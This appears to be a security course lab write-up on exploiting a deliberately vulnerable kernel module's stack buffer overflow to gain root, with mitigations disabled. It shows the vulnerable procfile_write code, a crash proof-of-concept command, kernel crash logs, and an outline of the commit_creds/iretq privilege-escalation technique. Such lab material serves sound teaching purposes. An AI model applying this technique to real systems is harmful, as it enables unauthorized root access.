# Lab 6 - Stack Smashing

In this Lab, we will be exploiting a buffer overflow vulnerability in a kernel module to attain root privileges.
We will be doing this in the x64 kernel image provided.
The following mitigations will be turned off in this lab:
 - SMEP / SMAP
 - kallsyms protection.
 - KASLR

You can read about them in more detail from the documentation provided for the previous lab.

###  Premise

We are the user on the system where a vulnerable kernel module has been inserted. 
This kernel module (smash.c) is similar to the one we saw in Lab 3. 
The module does the following : 
 - Creates a procfs file */proc/smash*, for which our user has read and write permissions.
 - */proc/smash* implements read and write, where the user can write to the buffer and the content written will be printed out when the file is read from.

#### Setting up the Premise
After compiling the module, copy  the setup script, (cmd.sh) and the complied module, (smash.ko) into the system using scp.
After which you can simply make the script executable and run which will setup the rest. 
```sh
scp -P 5022 cmd.sh modules/smash.ko root@localhost:.
```
On the system, once logged in:
```sh
chmod +x cmd.sh
./cmd.sh
```
### Vulnerability

The module has a very obvious buffer overflow vulnerability in the implementation of `procfile_write`.
```C
static
ssize_t procfile_write(struct file *file,const char *buffer, size_t count, loff_t *offset)
{
	char localbuf[8];
	/* get buffer size */
	procfs_buffer_size = count;
	/* write data to the buffer */
	if ( copy_from_user(procfs_buffer, buffer, procfs_buffer_size) ) {
		return -EFAULT;
	}
	memcpy(localbuf,procfs_buffer,procfs_buffer_size);
	printk(KERN_INFO "copied to buffer : %s", localbuf);
	return procfs_buffer_size;
}
```
There is no check before the `memcpy()` which copies contents from a user controlled buffer `procfs_buffer` of size 1024 bytes to `localbuf`. This results in a ridiculously big and easily exploitable buffer overflow.

### PoC

To check if we can exploit this vulnerability we will try to jump to an arbitrary address before we do anything meaningful.
To do this, the idea is that we will overflow the buffer to overwrite the saved `rip`, from where we will jump to our payload.
Since there are not a lot of local variables and the buffer is decidedly very small. By simply writing alphabets to `/proc/smash`, we can be sure of where the saved `rip` is.

```sh
printf "ABCDEFGHIJKLMNOPQRSTUVWXYZ" > /proc/smash
```

This results in a segmentation fault. Looking at the dmesg, we see the following : 

```sh
[  186.108640] copied to buffer : ABCDEFGHIJKLMNOPQRSTUVWXYZ
[  186.111020] general protection fault: 0000 [#1] SMP NOPTI
[  186.113342] CPU: 0 PID: 1109 Comm: sh Tainted: G           O      4.18.16 #1
[  186.113890] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel-1.11.2-0-gf9626ccb91-prebuilt.qemu-project.org 04/01/2014
[  186.114882] RIP: 0010:0x504f4e4d4c4b4a49
[  186.115089] Code: Bad RIP value.
[  186.115612] RSP: 0018:ffffc900000ffe48 EFLAGS: 00000292
[  186.115887] RAX: 000000000000001a RBX: ffff880005892900 RCX: 0000000000000000
[  186.116201] RDX: ffff88000781d250 RSI: ffff8800078154f8 RDI: ffff8800078154f8
[  186.116511] RBP: fffffffffffffffb R08: 5554535251504f4e R09: 0000000000000174
[  186.116862] R10: 5251504f4e4d4c4b R11: 4d4c4b4a49484746 R12: ffffc900000fff10
[  186.117240] R13: 00007f56a1745e20 R14: 0000000000000000 R15: 0000000000000000
[  186.117724] FS:  00007f56a19626a0(0000) GS:ffff880007800000(0000) knlGS:0000000000000000
[  186.118233] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  186.118659] CR2: 00000000004542ce CR3: 0000000005a3c000 CR4: 00000000000006f0
[  186.119372] Call Trace:
[  186.121654]  ? __vfs_write+0x21/0x150
[  186.121995]  ? selinux_file_permission+0xd0/0x120
[  186.122370]  ? _cond_resched+0x11/0x40
[  186.122613]  ? vfs_write+0xab/0x190
[  186.122835]  ? ksys_write+0x3d/0x90
[  186.123134]  ? do_syscall_64+0x43/0xf0
[  186.123496]  ? entry_SYSCALL_64_after_hwframe+0x44/0xa9
[  186.124010] Modules linked in: smash(O)
[  186.125733] ---[ end trace 2d33769f5c4f1df6 ]---
[  186.126354] RIP: 0010:0x504f4e4d4c4b4a49
[  186.126681] Code: Bad RIP value.
[  186.126991] RSP: 0018:ffffc900000ffe48 EFLAGS: 00000292
[  186.127627] RAX: 000000000000001a RBX: ffff880005892900 RCX: 0000000000000000
[  186.128289] RDX: ffff88000781d250 RSI: ffff8800078154f8 RDI: ffff8800078154f8
[  186.128835] RBP: fffffffffffffffb R08: 5554535251504f4e R09: 0000000000000174
[  186.129466] R10: 5251504f4e4d4c4b R11: 4d4c4b4a49484746 R12: ffffc900000fff10
[  186.129989] R13: 00007f56a1745e20 R14: 0000000000000000 R15: 0000000000000000
[  186.130608] FS:  00007f56a19626a0(0000) GS:ffff880007800000(0000) knlGS:0000000000000000
[  186.131313] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  186.131728] CR2: 00000000004542ce CR3: 0000000005a3c000 CR4: 00000000000006f0

```

The lines of our interest are : 

```sh
[  186.114882] RIP: 0010:0x504f4e4d4c4b4a49
[  186.115089] Code: Bad RIP value.
```

The `rip` value is the 'IJKLMNOP' part of our input. Thus we now know for sure that we can jump to an arbitrary address.
We also have the exact offset to saved `rip` - 8. 

### The Exploit

The exploit script can be found here: [exploit.c](exploit/exploit.c)
Now that we can point execution to where ever we want, we will obviously first do, `commit_creds(prepare_kernel_cred(0));` We will do this using hard-coded address for this lab.
But unlike the exploit in Lab5, in the process of gaining the execution flow, we have completely destroyed the stack, this means that we can no longer rely on the kernel to successfully return execution to user mode and will have to do it ourselves.
To do this successfully, we will have to restore the `trap frame` that is stored on the stack, the `iretq` instruction is used for doing this. 
Returning from kernel mode to user mode and executing shell can be done as illustrated in [exploit.c](exploit/exploit.c).  Also note the `swapgs` instruction which is used for preserving kernel information for a specific logical processor core across context switches.
